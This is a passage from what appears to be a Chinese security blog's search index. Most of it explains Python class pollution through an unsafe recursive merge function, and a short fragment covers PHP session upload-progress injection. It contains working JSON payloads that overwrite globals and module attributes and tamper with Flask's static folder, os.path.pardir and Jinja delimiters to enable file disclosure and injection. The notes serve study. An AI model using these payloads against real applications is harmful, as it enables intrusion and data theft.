stored in the session will look like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;upload_progress_ryat&quot;</span>]<br></code></pre></td></tr></table></figure><p><code>ryat</code>的部分可以注入自己的代码，如<code>ryat|序列化字符串</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>原型链-1</title>
    <link href="/2025/10/16/%E5%8E%9F%E5%9E%8B%E9%93%BE-1/"/>
    <url>/2025/10/16/%E5%8E%9F%E5%9E%8B%E9%93%BE-1/</url>
    
    <content type="html"><![CDATA[<h3 id="简析"><a href="#简析" class="headerlink" title="简析"></a>简析</h3><ul><li>根本原理和Nodejs原型链污染的根本原理相同，只不过<code>Nodejs</code>是<em><strong>对键值对的控制</strong></em>来进行污染，而<code>python</code>则是<em><strong>对类属性值的污染</strong></em>，且<strong>只能对类的属性进行污染</strong>而<strong>不能污染类的方法</strong></li></ul><h4 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<span class="hljs-comment"># 提取键值。为什么要items()？因为直接src只能得到键，而不能得到值，for k, v in ... 这种语法是 Python 的序列解包 (Sequence Unpacking)。它期望 `in` 后面的对象每次迭代时都能提供一个包含两个元素的序列（比如元组或列表）。</span><br><span class="hljs-comment"># 因此，`(键, 值)` 这种元组形式恰好能被 `k, v` 完美地解包，`k` 对应键，`v` 对应值</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br><span class="hljs-comment"># hasattr(object,name):判断对象是否包含对应的属性。这里是在检查 dst 是否定义了 __getitem__ 方法，检查其是否支持通过[]来访问成员</span><br><span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<span class="hljs-comment"># 如果存在dst中k键且v为字典</span><br>merge(v,dst.get(k))<span class="hljs-comment"># 递归调用 merge ，将src中的子字典合并到dst对应的子字典(dst.get(k))中</span><br><span class="hljs-keyword">else</span>:<br>dst[k] = v <span class="hljs-comment"># 赋值或覆盖</span><br><span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<span class="hljs-comment"># 为什么不能给k键直接赋值一个字典呢？这是为了实现深层合并而不是浅层覆盖，从而避免丢失嵌套的有效信息。而且如果是直接赋值的话肯定就污染不了了。比如同名字典中还有其它键，直接复制就会被覆盖了</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">setattr</span>(dst,k,v)<br></code></pre></td></tr></table></figure><h4 id="污染示例"><a href="#污染示例" class="headerlink" title="污染示例"></a>污染示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span> : &#123;<span class="hljs-comment"># 指向该实例的原型对象</span><br>        <span class="hljs-string">&quot;__base__&quot;</span> : &#123;<span class="hljs-comment"># 父类</span><br>            <span class="hljs-string">&quot;secret&quot;</span> : <span class="hljs-string">&quot;world&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-comment">#hello</span><br><span class="hljs-built_in">print</span>(instance.secret)<br><span class="hljs-comment">#hello</span><br>merge(payload, instance)<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-comment">#world</span><br><span class="hljs-built_in">print</span>(instance.secret)<br><span class="hljs-comment">#world</span><br><br>POST提交<br>Content-<span class="hljs-type">Type</span>: application/json<br></code></pre></td></tr></table></figure><h3 id="获取全局变量污染"><a href="#获取全局变量污染" class="headerlink" title="获取全局变量污染"></a>获取全局变量污染</h3><ul><li><code>__init__</code>作为一个类的内置方法，在<strong>没有被重写为函数</strong>的时候，其<em>数据类型</em>会被当作<em><strong>装饰器</strong></em></li><li><em><strong>装饰器的特点</strong></em>：<em><strong>都</strong></em>具有一个<strong>全局属性</strong><code>__globals__</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> :<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>:<br>name = <span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(demo.__globals__)<br><span class="hljs-comment"># 等同于 </span><br><span class="hljs-built_in">globals</span>() <br><span class="hljs-comment"># 等同于</span><br>A.__init__.__globals__<br>instance = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>            <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-comment"># 声明的类也是一个全局属性</span><br>                <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-number">5</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(B.name)<br><span class="hljs-built_in">print</span>(a)<br>merge(payload, instance)<br><span class="hljs-built_in">print</span>(B.name)<br><span class="hljs-built_in">print</span>(a)<br><br></code></pre></td></tr></table></figure></li></ul><h3 id="污染加载的其它模块"><a href="#污染加载的其它模块" class="headerlink" title="污染加载的其它模块"></a>污染加载的其它模块</h3><ul><li>在可以操控全局变量的情况下，我们能对入口文件的<em><strong>类对象或属性</strong></em>进行操作</li><li>如果目标对象不在入口文件中，就需要对其它加载过的模块来获取了</li></ul><h4 id="import加载污染"><a href="#import加载污染" class="headerlink" title="import加载污染"></a>import加载污染</h4><ul><li><code>import</code>入口文件同级下的目录<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> demo<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>                <span class="hljs-string">&quot;B&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;classa&quot;</span>:<span class="hljs-number">5</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">##demo.py</span><br>a = <span class="hljs-number">1</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>:<br>    classa = <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="sys加载污染"><a href="#sys加载污染" class="headerlink" title="sys加载污染"></a>sys加载污染</h4><ul><li>引用第三方模块或内置模块的环境</li><li>这时候就要借助<code>sys</code>模块中的<code>module</code>属性<ul><li>该属性能加载出<em><strong>自运行开始所有已加载的模块</strong></em><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>                        <span class="hljs-string">&quot;B&quot;</span>:&#123;<br>                            <span class="hljs-string">&quot;classa&quot;</span>:<span class="hljs-number">5</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="加载器loader污染"><a href="#加载器loader污染" class="headerlink" title="加载器loader污染"></a>加载器loader污染</h4><ul><li><code>sys</code>模块不是都有导入的，这时候就能借助<code>loader</code></li><li><code>loader</code>加载器是python为了<strong>实现模块加载</strong>而设计的类，其在<code>importlilb</code>这一内置模块中有具体实现</li><li>且<code>importlib</code>模块下的所有<code>py</code>文件都引入了<code>sys</code>模块</li><li>这样就能通过<code>&lt;模块名&gt;.__loader__.__init__.__globals__[&#39;sys&#39;]</code>来获取<code>sys</code>模块<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-comment"># 获取模块的loader</span><br>loader = math.__loader__<br><span class="hljs-comment"># 即 math 模块的 __loader__ 属性包含了一个 loader 对象，负责加载 math 模块</span><br><span class="hljs-comment"># 打印loader信息</span><br><span class="hljs-built_in">print</span>(loader)<br></code></pre></td></tr></table></figure></li></ul><h4 id="spec-污染"><a href="#spec-污染" class="headerlink" title="__spec__污染"></a><code>__spec__</code>污染</h4><ul><li>其包含了关于类加载时候的信息，定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>中</li><li>因此可以以<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>来获取<code>sys</code>模块</li></ul><h3 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a>函数形参默认值替换</h3><ul><li><code>__defaults__</code>：python中的一个内置元组，用于存储<strong>方法形参的默认参数值</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span>(a.__defaults__)<br><span class="hljs-comment">#(2, 3)</span><br></code></pre></td></tr></table></figure></li><li>因此可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：&#96;<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;demo&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;__defaults__&quot;</span> : (<span class="hljs-literal">True</span>,)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><code>__kwdefaults__</code>是以字典形式来进行收录：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;demo&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;__kwdefaults__&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;shell&quot;</span> : <span class="hljs-literal">True</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="flask的app关键属性"><a href="#flask的app关键属性" class="headerlink" title="flask的app关键属性"></a>flask的app关键属性</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python">app = Flask(__name__)<br><br><span class="hljs-comment"># _got_first_request:判断某次请求是否为flask启动后的第一次请求，返回布尔值，会影响装饰器:</span><br><span class="hljs-comment">## app.before_first_request 的调用</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_got_first_request&quot;</span>:<span class="hljs-literal">False</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># _static_url_path:被指定的static静态目录路径，污染后可实现重定向以获取其它文件下的信息</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_static_folder&quot;</span>:<span class="hljs-string">&quot;./&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># 在 flask 应用下访问 GET /../XXX 一般都会报错500，在 temlating.py 模块下发生</span><br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">500</span> INTERNAL SERVER ERROR<br><span class="hljs-comment">## 这是一个在模板渲染的时候为了防止目录穿梭进行的操作</span><br><span class="hljs-comment">## 使用 os.path.pairdir 来检验，其值为 .. </span><br><span class="hljs-comment">## 这个污染的是os模块下的吗？？？如果是的话为什么能污染到那？是因为是内置模块？</span><br><span class="hljs-comment">### 是因为 os 被 import 导入了</span><br><span class="hljs-comment">## 将其修改为任意值就能进行穿梭了</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;os&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;path&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;pardir&quot;</span>:<span class="hljs-string">&quot;,&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># `Flask.jinja_env.variable_start_string = &quot;xxx&quot;`</span><br><span class="hljs-comment">## 实现对`Jinja`语法标识符进行替换，这里把 &#123;&#123; 换成了 [[</span><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;app&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;jinja_env&quot;</span> :&#123;<br><span class="hljs-string">&quot;variable_start_string&quot;</span> : <span class="hljs-string">&quot;[[&quot;</span>,<span class="hljs-string">&quot;variable_end_string&quot;</span>:<span class="hljs-string">&quot;]]&quot;</span><br>&#125;        <br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">### 需要先污染再访问模板，因为会有缓存</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
